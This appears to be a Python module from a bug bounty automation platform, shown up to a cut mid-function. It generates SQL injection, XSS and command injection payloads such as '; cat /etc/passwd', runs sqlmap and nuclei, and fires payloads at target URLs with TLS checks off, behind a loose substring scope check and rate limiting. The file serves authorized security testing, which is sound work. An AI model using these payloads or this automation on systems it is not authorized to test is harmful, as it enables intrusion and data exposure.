"""
Exploitation Service for Bug Bounty Automation Platform
Handles automatic vulnerability exploitation with framework integration and custom payloads
"""

import asyncio
import json
import logging
import re
import time
import subprocess
import tempfile
import os
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass
from enum import Enum

import aiohttp
import requests
from celery import shared_task
from sqlalchemy.orm import Session
from sqlalchemy import and_, or_

from backend.models import (
    Vulnerability, ExploitationChain, Target, ScanSession,
    VulnSeverity, ToolStatus
)
from backend.core.database import get_db_session
from backend.services.notification_service import NotificationService


class ExploitationResult(Enum):
    SUCCESS = "success"
    PARTIAL = "partial"
    FAILED = "failed"
    BLOCKED = "blocked"
    OUT_OF_SCOPE = "out_of_scope"
    RATE_LIMITED = "rate_limited"


class ExploitationFramework(Enum):
    METASPLOIT = "metasploit"
    SQLMAP = "sqlmap"
    NUCLEI = "nuclei"
    CUSTOM = "custom"
    BURP_SUITE = "burp_suite"


@dataclass
class PayloadResult:
    success: bool
    response_code: int
    response_content: str
    execution_time: float
    evidence: Dict[str, Any]
    framework_used: ExploitationFramework
    payload_type: str
    error_message: Optional[str] = None
    exploitation_chain_possible: bool = False


@dataclass
class RateLimitTracker:
    target_id: str
    last_request_time: float
    request_count: int
    window_start: float


class CustomPayloadGenerator:
    """Generates custom payloads based on vulnerability context and target environment"""
    
    def __init__(self):
        self.logger = logging.getLogger(__name__)
        
    def generate_sqli_payloads(self, vuln: Vulnerability, target: Target) -> List[str]:
        """Generate SQL injection payloads based on context"""
        base_payloads = []
        
        # Analyze URL and parameter context
        url_lower = vuln.affected_url.lower()
        param = vuln.affected_parameter or ""
        
        # Database-specific payloads based on technology stack
        if any(tech in url_lower for tech in ['mysql', 'php']):
            base_payloads.extend([
                "1' AND (SELECT SLEEP(3))-- ",
                "1' UNION SELECT user(),database(),version()-- ",
                "1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- ",
            ])
        elif any(tech in url_lower for tech in ['mssql', 'asp', '.net']):
            base_payloads.extend([
                "1'; WAITFOR DELAY '00:00:03'-- ",
                "1' UNION SELECT @@version,user_name(),db_name()-- ",
                "1' AND 1=(SELECT COUNT(*) FROM master..sysdatabases WHERE name='master')-- ",
            ])
        elif any(tech in url_lower for tech in ['postgres', 'psql']):
            base_payloads.extend([
                "1'; SELECT pg_sleep(3)-- ",
                "1' UNION SELECT version(),current_user,current_database()-- ",
                "1' AND 1=1-- ",
            ])
        elif any(tech in url_lower for tech in ['oracle']):
            base_payloads.extend([
                "1' AND 1=1 AND (SELECT COUNT(*) FROM dual)>0-- ",
                "1' UNION SELECT banner,null,null FROM v$version-- ",
            ])
        else:
            # Generic payloads
            base_payloads.extend([
                "1' OR '1'='1",
                "1' UNION SELECT 1,2,3-- ",
                "1'; SELECT 1-- ",
                "1' AND SLEEP(3)-- ",
            ])
        
        # Context-specific encoding
        encoded_payloads = []
        for payload in base_payloads:
            encoded_payloads.append(payload)  # Original
            encoded_payloads.append(payload.replace("'", "%27"))  # URL encoded
            encoded_payloads.append(payload.replace(" ", "/**/"))  # Space bypass
            
        return encoded_payloads[:15]  # Limit to prevent excessive requests
    
    def generate_xss_payloads(self, vuln: Vulnerability, target: Target) -> List[str]:
        """Generate XSS payloads based on context and filters"""
        payloads = []
        
        # Basic payloads
        payloads.extend([
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
        ])
        
        # Filter bypass payloads
        payloads.extend([
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<img src=\"x\" onerror=\"alert('XSS')\">",
            "<svg/onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')>",
            "<%73cript>alert('XSS')</script>",
            "<script>eval(atob('YWxlcnQoJ1hTUycpOw=='))</script>",  # Base64 encoded
        ])
        
        # Context-aware payloads
        if "search" in (vuln.affected_parameter or "").lower():
            payloads.extend([
                "\"><script>alert('XSS')</script>",
                "'+alert('XSS')+'",
                "';alert('XSS');//",
            ])
        
        return payloads
    
    def generate_command_injection_payloads(self, vuln: Vulnerability, target: Target) -> List[str]:
        """Generate command injection payloads"""
        payloads = []
        
        # Basic command injection
        payloads.extend([
            "; whoami",
            "| whoami",
            "&& whoami",
            "$(whoami)",
            "`whoami`",
            "; id",
            "| id",
            "&& id",
        ])
        
        # Time-based payloads
        payloads.extend([
            "; sleep 3",
            "| ping -c 3 127.0.0.1",
            "&& timeout 3",
            "; ping -c 3 127.0.0.1",
        ])
        
        # OS-specific payloads
        payloads.extend([
            "; cat /etc/passwd",  # Linux
            "| type C:\\Windows\\System32\\drivers\\etc\\hosts",  # Windows
            "&& ls -la",  # Linux
            "; dir",  # Windows
        ])
        
        return payloads


class ExploitationFrameworkIntegrator:
    """Integrates with external exploitation frameworks"""
    
    def __init__(self):
        self.logger = logging.getLogger(__name__)
        
    async def run_sqlmap(self, vuln: Vulnerability, target: Target) -> PayloadResult:
        """Run SQLMap against SQL injection vulnerability"""
        try:
            # Create temporary request file
            with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
                request_content = self._build_request_for_sqlmap(vuln, target)
                f.write(request_content)
                request_file = f.name
            
            # Build SQLMap command
            cmd = [
                'sqlmap',
                '-r', request_file,
                '--batch',
                '--level=2',
                '--risk=2',
                '--timeout=30',
                '--retries=1',
                '--threads=1',
                f'--delay={target.request_delay_ms / 1000}',
                '--technique=BEUSTQ',
                '--output-dir=/tmp/sqlmap_output'
            ]
            
            # Add authentication if present
            if target.authentication_headers:
                headers = []
                for key, value in target.authentication_headers.items():
                    headers.append(f"{key}: {value}")
                cmd.extend(['--headers', '\n'.join(headers)])
            
            # Execute SQLMap
            start_time = time.time()
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            execution_time = time.time() - start_time
            
            # Parse SQLMap output
            success = 'sqlmap identified the back-end DBMS' in result.stdout
            
            evidence = {
                'sqlmap_output': result.stdout[:2000],
                'command_used': ' '.join(cmd),
                'injection_found': success,
                'execution_time': execution_time
            }
            
            return PayloadResult(
                success=success,
                response_code=200 if success else 0,
                response_content=result.stdout[:1000],
                execution_time=execution_time,
                evidence=evidence,
                framework_used=ExploitationFramework.SQLMAP,
                payload_type='automated_sqli'
            )
            
        except subprocess.TimeoutExpired:
            return PayloadResult(
                success=False,
                response_code=0,
                response_content="",
                execution_time=300,
                evidence={},
                framework_used=ExploitationFramework.SQLMAP,
                payload_type='automated_sqli',
                error_message="SQLMap execution timeout"
            )
        except Exception as e:
            self.logger.error(f"SQLMap execution error: {e}")
            return PayloadResult(
                success=False,
                response_code=0,
                response_content="",
                execution_time=0,
                evidence={},
                framework_used=ExploitationFramework.SQLMAP,
                payload_type='automated_sqli',
                error_message=str(e)
            )
        finally:
            # Cleanup
            if 'request_file' in locals():
                os.unlink(request_file)
    
    async def run_nuclei_exploit(self, vuln: Vulnerability, target: Target) -> PayloadResult:
        """Run Nuclei exploit templates"""
        try:
            # Map vulnerability type to nuclei template tags
            template_tags = self._get_nuclei_tags_for_vuln(vuln)
            
            if not template_tags:
                return PayloadResult(
                    success=False,
                    response_code=0,
                    response_content="",
                    execution_time=0,
                    evidence={},
                    framework_used=ExploitationFramework.NUCLEI,
                    payload_type='nuclei_exploit',
                    error_message="No suitable nuclei templates found"
                )
            
            # Build Nuclei command
            cmd = [
                'nuclei',
                '-u', vuln.affected_url,
                '-tags', ','.join(template_tags),
                '-severity', 'high,critical',
                '-timeout', '30',
                '-retries', '1',
                '-rate-limit', str(int(target.requests_per_second)),
                '-json'
            ]
            
            # Add headers if present
            if target.required_headers or target.authentication_headers:
                headers = {**target.required_headers, **target.authentication_headers}
                header_string = ';'.join([f"{k}: {v}" for k, v in headers.items()])
                cmd.extend(['-header', header_string])
            
            start_time = time.time()
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            execution_time = time.time() - start_time
            
            # Parse JSON output
            success = result.returncode == 0 and result.stdout.strip()
            findings = []
            
            if success and result.stdout:
                for line in result.stdout.strip().split('\n'):
                    try:
                        finding = json.loads(line)
                        findings.append(finding)
                    except json.JSONDecodeError:
                        continue
            
            return PayloadResult(
                success=len(findings) > 0,
                response_code=200 if success else 0,
                response_content=result.stdout[:1000],
                execution_time=execution_time,
                evidence={
                    'nuclei_findings': findings,
                    'command_used': ' '.join(cmd),
                    'templates_matched': len(findings)
                },
                framework_used=ExploitationFramework.NUCLEI,
                payload_type='nuclei_exploit'
            )
            
        except subprocess.TimeoutExpired:
            return PayloadResult(
                success=False,
                response_code=0,
                response_content="",
                execution_time=120,
                evidence={},
                framework_used=ExploitationFramework.NUCLEI,
                payload_type='nuclei_exploit',
                error_message="Nuclei execution timeout"
            )
        except Exception as e:
            self.logger.error(f"Nuclei execution error: {e}")
            return PayloadResult(
                success=False,
                response_code=0,
                response_content="",
                execution_time=0,
                evidence={},
                framework_used=ExploitationFramework.NUCLEI,
                payload_type='nuclei_exploit',
                error_message=str(e)
            )
    
    def _build_request_for_sqlmap(self, vuln: Vulnerability, target: Target) -> str:
        """Build HTTP request file for SQLMap"""
        method = vuln.http_method.upper() if vuln.http_method else 'GET'
        
        # Parse URL and add vulnerable parameter
        if method == 'POST':
            request = f"{method} {vuln.affected_url} HTTP/1.1\n"
            request += f"Host: {requests.utils.urlparse(vuln.affected_url).netloc}\n"
            request += "Content-Type: application/x-www-form-urlencoded\n"
            
            # Add headers
            for key, value in target.required_headers.items():
                request += f"{key}: {value}\n"
            for key, value in target.authentication_headers.items():
                request += f"{key}: {value}\n"
            
            request += "\n"
            request += f"{vuln.affected_parameter}=1*"  # SQLMap injection point
        else:
            url_with_param = f"{vuln.affected_url}?{vuln.affected_parameter}=1*"
            request = f"{method} {url_with_param} HTTP/1.1\n"
            request += f"Host: {requests.utils.urlparse(vuln.affected_url).netloc}\n"
            
            # Add headers
            for key, value in target.required_headers.items():
                request += f"{key}: {value}\n"
            for key, value in target.authentication_headers.items():
                request += f"{key}: {value}\n"
            
            request += "\n"
        
        return request
    
    def _get_nuclei_tags_for_vuln(self, vuln: Vulnerability) -> List[str]:
        """Map vulnerability type to Nuclei template tags"""
        vuln_type = vuln.vulnerability_type.lower()
        
        tag_mapping = {
            'xss': ['xss'],
            'sqli': ['sqli', 'injection'],
            'sql_injection': ['sqli', 'injection'],
            'command_injection': ['rce', 'injection'],
            'file_upload': ['fileupload', 'rce'],
            'path_traversal': ['lfi', 'traversal'],
            'ssrf': ['ssrf'],
            'csrf': ['csrf'],
            'idor': ['idor'],
            'open_redirect': ['redirect'],
            'xxe': ['xxe'],
            'ssti': ['ssti', 'injection'],
            'nosql_injection': ['nosqli', 'injection']
        }
        
        tags = []
        for vuln_key, vuln_tags in tag_mapping.items():
            if vuln_key in vuln_type:
                tags.extend(vuln_tags)
        
        return list(set(tags))  # Remove duplicates


class RateLimitManager:
    """Manages rate limiting for exploitation requests"""
    
    def __init__(self):
        self.trackers: Dict[str, RateLimitTracker] = {}
        self.logger = logging.getLogger(__name__)
    
    async def can_make_request(self, target: Target) -> bool:
        """Check if request is allowed based on rate limits"""
        target_id = str(target.id)
        current_time = time.time()
        
        if target_id not in self.trackers:
            self.trackers[target_id] = RateLimitTracker(
                target_id=target_id,
                last_request_time=0,
                request_count=0,
                window_start=current_time
            )
        
        tracker = self.trackers[target_id]
        
        # Reset window if 60 seconds have passed
        if current_time - tracker.window_start >= 60:
            tracker.window_start = current_time
            tracker.request_count = 0
        
        # Check requests per second
        if current_time - tracker.last_request_time < (1.0 / target.requests_per_second):
            return False
        
        # Check concurrent requests (simplified - in production use proper semaphore)
        max_requests_per_minute = target.requests_per_second * 60
        if tracker.request_count >= max_requests_per_minute:
            return False
        
        return True
    
    async def record_request(self, target: Target):
        """Record a request for rate limiting"""
        target_id = str(target.id)
        current_time = time.time()
        
        if target_id in self.trackers:
            tracker = self.trackers[target_id]
            tracker.last_request_time = current_time
            tracker.request_count += 1
    
    async def wait_for_rate_limit(self, target: Target):
        """Wait if rate limit would be exceeded"""
        while not await self.can_make_request(target):
            await asyncio.sleep(target.request_delay_ms / 1000.0)


class ExploitationService:
    """Service for managing automatic vulnerability exploitation"""
    
    def __init__(self):
        self.logger = logging.getLogger(__name__)
        self.payload_generator = CustomPayloadGenerator()
        self.framework_integrator = ExploitationFrameworkIntegrator()
        self.rate_limiter = RateLimitManager()
        self.notification_service = NotificationService()
        
    @shared_task
    def exploit_vulnerability_async(self, vulnerability_id: str):
        """Celery task for asynchronous vulnerability exploitation"""
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            result = loop.run_until_complete(
                self.exploit_vulnerability(vulnerability_id)
            )
            return result.value
        finally:
            loop.close()
    
    async def exploit_vulnerability(self, vulnerability_id: str) -> ExploitationResult:
        """Automatically exploit a vulnerability"""
        with get_db_session() as db:
            vuln = db.query(Vulnerability).filter(Vulnerability.id == vulnerability_id).first()
            if not vuln:
                self.logger.error(f"Vulnerability {vulnerability_id} not found")
                return ExploitationResult.FAILED
            
            target = db.query(Target).filter(Target.id == vuln.scan_session.target_id).first()
            if not target or not target.is_active:
                self.logger.error(f"Target not found or inactive")
                return ExploitationResult.OUT_OF_SCOPE
            
            # Validate scope
            if not self._is_exploitation_in_scope(vuln, target):
                self.logger.warning(f"Exploitation out of scope for {vuln.affected_url}")
                await self.notification_service.create_notification(
                    user_id=target.researcher_username,
                    title="Exploitation Blocked - Out of Scope",
                    message=f"Vulnerability {vuln.vulnerability_name} at {vuln.affected_url} is out of scope",
                    notification_type="warning"
                )
                return ExploitationResult.OUT_OF_SCOPE
            
            # Check rate limits
            if not await self.rate_limiter.can_make_request(target):
                self.logger.info(f"Rate limit exceeded for target {target.target_name}")
                return ExploitationResult.RATE_LIMITED
            
            # Notify exploitation start
            await self.notification_service.create_notification(
                user_id=target.researcher_username,
                title="Exploitation Started",
                message=f"Starting exploitation of {vuln.vulnerability_name} at {vuln.affected_url}",
                notification_type="info"
            )
            
            # Perform exploitation based on vulnerability type and preference
            result = await self._execute_exploitation(vuln, target)
            
            # Record exploitation attempt
            await self._record_exploitation_attempt(vuln, result, db)
            await self.rate_limiter.record_request(target)
            
            # Send notifications based on result
            if result.success:
                await self.notification_service.create_notification(
                    user_id=target.researcher_username,
                    title="🎯 Successful Exploitation!",
                    message=f"Successfully exploited {vuln.vulnerability_name} using {result.framework_used.value}",
                    notification_type="success",
                    metadata={
                        "vulnerability_id": str(vuln.id),
                        "exploitation_time": result.execution_time,
                        "framework_used": result.framework_used.value,
                        "evidence_summary": result.evidence
                    }
                )
                
                # Check for exploitation chaining opportunities
                if result.exploitation_chain_possible:
                    await self._identify_chain_opportunities(vuln, db)
            else:
                await self.notification_service.create_notification(
                    user_id=target.researcher_username,
                    title="Exploitation Failed",
                    message=f"Failed to exploit {vuln.vulnerability_name}: {result.error_message}",
                    notification_type="error"
                )
            
            return ExploitationResult.SUCCESS if result.success else ExploitationResult.FAILED
    
    async def create_exploitation_chain(self, vulnerability_ids: List[str], 
                                      chain_name: str, chain_description: str) -> str:
        """Create and execute an exploitation chain"""
        with get_db_session() as db:
            vulns = db.query(Vulnerability).filter(
                Vulnerability.id.in_(vulnerability_ids)
            ).all()
            
            if len(vulns) != len(vulnerability_ids):
                raise ValueError("Some vulnerabilities not found")
            
            # Check all belong to same scan session
            scan_sessions = set(v.scan_session_id for v in vulns)
            if len(scan_sessions) > 1:
                raise ValueError("All vulnerabilities must belong to same scan session")
            
            target = db.query(Target).filter(
                Target.id == vulns[0].scan_session.target_id
            ).first()
            
            # Notify chain start
            await self.notification_service.create_notification(
                user_id=target.researcher_username,
                title="🔗 Exploitation Chain Started",
                message=f"Starting exploitation chain '{chain_name}' with {len(vulns)} vulnerabilities",
                notification_type="info"
            )
            
            chain_id = None
            total_steps = len(vulns)
            successful_steps = 0
            
            for step_num, vuln in enumerate(vulns, 1):
                # Check rate limits before each step
                await self.rate_limiter.wait_for_rate_limit(target)
                
                chain = ExploitationChain(
                    vulnerability_id=vuln.id,
                    chain_name=chain_name,
                    chain_description=chain_description,
                    step_number=step_num,
                    total_steps=total_steps,
                    step_description=f"Exploit {vuln.vulnerability_name} at {vuln.affected_url}"
                )
                
                db.add(chain)
                db.commit()
                
                if step_num == 1:
                    chain_id = chain.id
                
                # Execute exploitation step
                result = await self._execute_exploitation(vuln, target)
                await self.rate_limiter.record_request(target)
                
                # Update chain with results
                chain.payload = result.evidence.get('payload_used', '')
                chain.actual_result = result.response_content[:1000]
                chain.step_successful = result.success
                chain.request_response_log = json.dumps({
                    'response_code': result.response_code,
                    'execution_time': result.execution_time,
                    'evidence': result.evidence,
                    'framework_used': result.framework_used.value
                })
                
                if result.success:
                    successful_steps += 1
                    chain.impact_increase = self._calculate_chain_impact_increase(step_num, total_steps)
                
                db.commit()
                
                # Notify step completion
                status = "✅ Success" if result.success else "❌ Failed"
                await self.notification_service.create_notification(
                    user_id=target.researcher_username,
                    title=f"Chain Step {step_num}/{total_steps}: {status}",
                    message=f"Step {step_num} of '{chain_name}': {vuln.vulnerability_name}",
                    notification_type="success" if result.success else "warning"
                )
                
                # Continue chain even if step fails (for intelligence gathering)
                # But log the failure for analysis
                if not result.success:
                    self.logger.warning(f"Chain step {step_num} failed, continuing...")
            
            # Determine overall chain success
            chain_success = successful_steps > 0
            final_impact = self._assess_chain_impact(vulns, successful_steps, total_steps)
            
            # Update all chain records with final status
            db.query(ExploitationChain).filter(
                ExploitationChain.chain_name == chain_name
            ).update({
                'chain_successful': chain_success,
                'final_impact_description': final_impact
            })
            
            db.commit()
            
            # Final notification
            await self.notification_service.create_notification(
                user_id=target.researcher_username,
                title=f"🔗 Exploitation Chain Complete: {chain_name}",
                message=f"Chain completed: {successful_steps}/{total_steps} steps successful. Impact: {final_impact}",
                notification_type="success" if chain_success else "warning",
                metadata={
                    "chain_name": chain_name,
                    "successful_steps": successful_steps,
                    "total_steps": total_steps,
                    "final_impact": final_impact
                }
            )
            
            return str(chain_id)
    
    async def _execute_exploitation(self, vuln: Vulnerability, target: Target) -> PayloadResult:
        """Execute exploitation using appropriate method"""
        vuln_type = vuln.vulnerability_type.lower()
        
        # Try framework-based exploitation first for certain types
        if 'sql' in vuln_type:
            # Try SQLMap first
            result = await self.framework_integrator.run_sqlmap(vuln, target)
            if result.success:
                return result
            
            # Fall back to custom payloads
            return await self._execute_custom_exploitation(vuln, target)
        
        elif vuln_type in ['xss', 'command_injection', 'rce']:
            # Try Nuclei first
            result = await self.framework_integrator.run_nuclei_exploit(vuln, target)
            if result.success:
                return result
            
            # Fall back to custom payloads
            return await self._execute_custom_exploitation(vuln, target)
        
        else:
            # Use custom payloads for other vulnerability types
            return await self._execute_custom_exploitation(vuln, target)
    
    async def _execute_custom_exploitation(self, vuln: Vulnerability, target: Target) -> PayloadResult:
        """Execute custom payload-based exploitation"""
        vuln_type = vuln.vulnerability_type.lower()
        
        # Generate appropriate payloads
        if 'sql' in vuln_type:
            payloads = self.payload_generator.generate_sqli_payloads(vuln, target)
            return await self._test_sqli_payloads(vuln, target, payloads)
        elif 'xss' in vuln_type:
            payloads = self.payload_generator.generate_xss_payloads(vuln, target)
            return await self._test_xss_payloads(vuln, target, payloads)
        elif 'command' in vuln_type or 'injection' in vuln_type:
            payloads = self.payload_generator.generate_command_injection_payloads(vuln, target)
            return await self._test_command_injection_payloads(vuln, target, payloads)
        else:
            return PayloadResult(
                success=False,
                response_code=0,
                response_content="",
                execution_time=0,
                evidence={},
                framework_used=ExploitationFramework.CUSTOM,
                payload_type="unsupported",
                error_message=f"No exploitation method for {vuln_type}"
            )
    
    async def _test_sqli_payloads(self, vuln: Vulnerability, target: Target, 
                                payloads: List[str]) -> PayloadResult:
        """Test SQL injection payloads"""
        headers = {**target.required_headers, **target.authentication_headers}
        
        for payload in payloads:
            try:
                # Wait for rate limit
                await self.rate_limiter.wait_for_rate_limit(target)
                
                start_time = time.time()
                
                if vuln.http_method and vuln.http_method.upper() == 'POST':
                    data = {vuln.affected_parameter: payload}
                    response = requests.post(
                        vuln.affected_url,
                        data=data,
                        headers=headers,
                        timeout=30,
                        verify=False
                    )
                else:
                    params = {vuln.affected_parameter: payload}
                    response = requests.get(
                        vuln.affected_url,
                        params=params,
                        headers=headers,
                        timeout=30,
                        verify=False
                    )
                
                execution_time = time.time() - start_time
                
                # Advanced SQL injection detection
                success_indicators = self._analyze_sqli_response(response, execution_time, payload)
                
                if success_indicators['is_vulnerable']:
                    return PayloadResult(
                        success=True,
                        response_code=response.status_code,
                        response_content=response.text[:2000],
                        execution_time=execution_time,
                        evidence={
                            "payload_used": payload,
                            "detection_method": success_indicators['detection_method'],
                            "sql_errors_found": success_indicators['sql_errors'],
                            "time_delay_detected": success_indicators['time_based'],
                            "union_injection": success_indicators['union_based'],
                            "response_length": len(response.text)
                        },
                        framework_used=ExploitationFramework.CUSTOM,
                        payload_type="custom_sqli",
                        exploitation_chain_possible=True
                    )
                    
            except Exception as e:
                self.logger.error(f"SQLi payload testing error: {e}")
                continue
                
        return PayloadResult(
            success=False,
            response_code=0,
            response_content="",
            execution_time=0,
            evidence={},
            framework_used=ExploitationFramework.CUSTOM,
            payload_type="custom_sqli",
            error_message="No successful SQL injection exploitation"
        )
    
    async def _test_xss_payloads(self, vuln: Vulnerability, target: Target, 
                               payloads: List[str]) -> PayloadResult:
        """Test XSS payloads"""
        headers = {**target.required_headers, **target.authentication_headers}
        
        for payload in payloads:
            try:
                await self.rate_limiter.wait_for_rate_limit(target)
                
                if vuln.http_method and vuln.http_method.upper() == 'POST':
                    data = {vuln.affected_parameter: payload}
                    response = requests.post(
                        vuln.affected_url,
                        data=data,
                        headers=headers,
                        timeout=15,
                        verify=False
                    )
                else:
                    params = {vuln.affected_parameter: payload}
                    response = requests.get(
                        vuln.affected_url,
                        params=params,
                        headers=headers,
                        timeout=15,
                        verify=False
                    )
                
                # Analyze XSS response
                xss_analysis = self._analyze_xss_response(response, payload)
                
                if xss_analysis['is_vulnerable']:
                    return PayloadResult(
                        success=True,
                        response_code=response.status_code,
                        response_content=response.text[:2000],
                        execution_time=0,
                        evidence={
                            "payload_used": payload,
                            "reflection_context": xss_analysis['context'],
                            "payload_reflected": xss_analysis['reflected'],
                            "filter_bypass": xss_analysis['filter_bypass'],
                            "dom_based": xss_analysis['dom_based']
                        },
                        framework_used=ExploitationFramework.CUSTOM,
                        payload_type="custom_xss",
                        exploitation_chain_possible=xss_analysis['chain_potential']
                    )
                    
            except Exception as e:
                self.logger.error(f"XSS payload testing error: {e}")
                continue
                
        return PayloadResult(
            success=False,
            response_code=0,
            response_content="",
            execution_time=0,
            evidence={},
            framework_used=ExploitationFramework.CUSTOM,
            payload_type="custom_xss",
            error_message="No successful XSS exploitation"
        )
    
    async def _test_command_injection_payloads(self, vuln: Vulnerability, target: Target, 
                                             payloads: List[str]) -> PayloadResult:
        """Test command injection payloads"""
        headers = {**target.required_headers, **target.authentication_headers}
        
        for payload in payloads:
            try:
                await self.rate_limiter.wait_for_rate_limit(target)
                
                start_time = time.time()
                
                if vuln.http_method and vuln.http_method.upper() == 'POST':
                    data = {vuln.affected_parameter: payload}
                    response = requests.post(
                        vuln.affected_url,
                        data=data,
                        headers=headers,
                        timeout=30,
                        verify=False
                    )
                else:
                    params = {vuln.affected_parameter: payload}
                    response = requests.get(
                        vuln.affected_url,
                        params=params,
                        headers=headers,
                        timeout=30,
                        verify=False
                    )
                
                execution_time = time.time() - start_time
                
                # Analyze command injection response
                cmd_analysis = self._analyze_command_injection_response(response, execution_time, payload)
                
                if cmd_analysis['is_vulnerable']:
                    return PayloadResult(
                        success=True,
                        response_code=response.status_code,
                        response_content=response.text[:2000],
                        execution_time=execution_time,
                        evidence={
                            "payload_used": payload,
                            "command_output_detected": cmd_analysis['command_output'],
                            "time_delay_detected": cmd_analysis['time_based'],
                            "system_info_leaked": cmd_analysis['system_info'],
                            "execution_time": execution_time
                        },
                        framework_used=ExploitationFramework.CUSTOM,
                        payload_type="custom_command_injection",
                        exploitation_chain_possible=True
                    )
                    
            except Exception as e:
                self.logger.error(f"Command injection payload testing error: {e}")
                continue
                
        return PayloadResult(
            success=False,
            response_code=0,
            response_content="",
            execution_time=0,
            evidence={},
            framework_used=ExploitationFramework.CUSTOM,
            payload_type="custom_command_injection",
            error_message="No successful command injection exploitation"
        )
    
    def _analyze_sqli_response(self, response, execution_time: float, payload: str) -> Dict[str, Any]:
        """Analyze response for SQL injection indicators"""
        response_text = response.text.lower()
        
        # SQL error patterns
        sql_error_patterns = [
            r'mysql.*error', r'ora-\d{5}', r'microsoft.*odbc.*sql',
            r'postgresql.*error', r'sql.*syntax.*error', r'sqlite.*error',
            r'you have an error in your sql syntax', r'quoted string not properly terminated',
            r'unclosed quotation mark', r'operand should contain 1 column'
        ]
        
        sql_errors = []
        for pattern in sql_error_patterns:
            matches = re.findall(pattern, response_text)
            sql_errors.extend(matches)
        
        # Time-based detection
        time_based = execution_time > 2.5
        
        # Union-based detection
        union_indicators = ['union', 'select', 'from', 'where']
        union_based = all(indicator in response_text for indicator in union_indicators)
        
        # Boolean-based detection
        boolean_indicators = ['true', 'false', '1=1', '1=0']
        boolean_based = any(indicator in payload.lower() and indicator in response_text 
                          for indicator in boolean_indicators)
        
        is_vulnerable = bool(sql_errors) or time_based or union_based or boolean_based
        
        detection_method = []
        if sql_errors:
            detection_method.append("error_based")
        if time_based:
            detection_method.append("time_based")
        if union_based:
            detection_method.append("union_based")
        if boolean_based:
            detection_method.append("boolean_based")
        
        return {
            'is_vulnerable': is_vulnerable,
            'detection_method': detection_method,
            'sql_errors': sql_errors,
            'time_based': time_based,
            'union_based': union_based,
            'boolean_based': boolean_based
        }
    
    def _analyze_xss_response(self, response, payload: str) -> Dict[str, Any]:
        """Analyze response for XSS indicators"""
        response_text = response.text
        
        # Check if payload is reflected
        reflected = payload in response_text or payload.replace('"', '&quot;') in response_text
        
        # Analyze reflection context
        context = "unknown"
        if f'value="{payload}"' in response_text:
            context = "input_value"
        elif f'>{payload}<' in response_text:
            context = "html_content"
        elif f'"{payload}"' in response_text:
            context = "attribute_value"
        elif f"'{payload}'" in response_text:
            context = "javascript_string"
        elif payload in response_text:
            context = "raw_reflection"
        
        # Check for filter bypass indicators
        filter_bypass = False
        if payload in response_text and any(char in payload for char in ['<', '>', '"', "'"]):
            filter_bypass = True
        
        # Check for DOM-based XSS potential
        dom_indicators = ['document.', 'innerHTML', 'eval(', 'setTimeout(', 'location.']
        dom_based = any(indicator in response_text for indicator in dom_indicators)
        
        # Determine chain potential
        chain_potential = reflected and context in ['html_content', 'javascript_string']
        
        return {
            'is_vulnerable': reflected,
            'reflected': reflected,
            'context': context,
            'filter_bypass': filter_bypass,
            'dom_based': dom_based,
            'chain_potential': chain_potential
        }
    
    def _analyze_command_injection_response(self, response, execution_time: float, 
                                          payload: str) -> Dict[str, Any]:
        """Analyze response for command injection indicators"""
        response_text = response.text.lower()
        
        # Command output indicators
        command_indicators = [
            'root:', 'www-data', 'apache', 'nginx', 'nobody',  # whoami/id results
            'uid=', 'gid=', 'groups=',  # id command results
            '/bin/', '/usr/', '/etc/', '/var/',  # file paths
            'drwx', '-rw-', '-rwx',  # ls -la output
            'volume in drive', 'directory of',  # Windows dir output
        ]
        
        command_output = any(indicator in response_text for indicator in command_indicators)
        
        # Time-based detection
        time_based = execution_time > 2.5
        
        # System information leakage
        system_info_indicators = [
            'linux', 'windows', 'darwin', 'freebsd',  # OS names
            'kernel', 'version', 'release',  # System info
            'localhost', '127.0.0.1', '::1',  # Network info
        ]
        
        system_info = any(indicator in response_text for indicator in system_info_indicators)
        
        return {
            'is_vulnerable': command_output or time_based,
            'command_output': command_output,
            'time_based': time_based,
            'system_info': system_info
        }
    
    def _is_exploitation_in_scope(self, vuln: Vulnerability, target: Target) -> bool:
        """Check if vulnerability exploitation is within scope"""
        url = vuln.affected_url
        
        # Check against out-of-scope URLs
        for out_of_scope in target.out_of_scope_urls:
            if out_of_scope in url:
                return False
        
        # Check against in-scope URLs
        for in_scope in target.in_scope_urls:
            if in_scope in url:
                return True
        
        # Check if URL matches main domain
        if target.main_url in url or (target.wildcard_url and target.wildcard_url in url):
            return True
        
        return False
    
    async def _record_exploitation_attempt(self, vuln: Vulnerability, 
                                         result: PayloadResult, db: Session):
        """Record exploitation attempt in database"""
        vuln.is_exploitable = result.success
        vuln.exploitation_difficulty = "easy" if result.success else "hard"
        vuln.exploitation_notes = json.dumps({
            "last_attempt": datetime.utcnow().isoformat(),
            "result": result.success,
            "framework_used": result.framework_used.value,
            "payload_type": result.payload_type,
            "evidence": result.evidence,
            "error": result.error_message,
            "execution_time": result.execution_time
        })
        
        db.commit()
    
    async def _identify_chain_opportunities(self, vuln: Vulnerability, db: Session):
        """Identify potential exploitation chain opportunities"""
        # Find other vulnerabilities in the same scan session
        related_vulns = db.query(Vulnerability).filter(
            and_(
                Vulnerability.scan_session_id == vuln.scan_session_id,
                Vulnerability.id != vuln.id,
                Vulnerability.is_exploitable == True
            )
        ).all()
        
        if len(related_vulns) > 0:
            target = db.query(Target).filter(Target.id == vuln.scan_session.target_id).first()
            
            # Suggest exploitation chain
            chain_suggestions = []
            for related_vuln in related_vulns:
                impact_score = self._calculate_chain_impact_score(vuln, related_vuln)
                if impact_score > 7.0:  # High impact potential
                    chain_suggestions.append({
                        "vulnerability_id": str(related_vuln.id),
                        "vulnerability_name": related_vuln.vulnerability_name,
                        "impact_score": impact_score
                    })
            
            if chain_suggestions:
                await self.notification_service.create_notification(
                    user_id=target.researcher_username,
                    title="🔗 Exploitation Chain Opportunity",
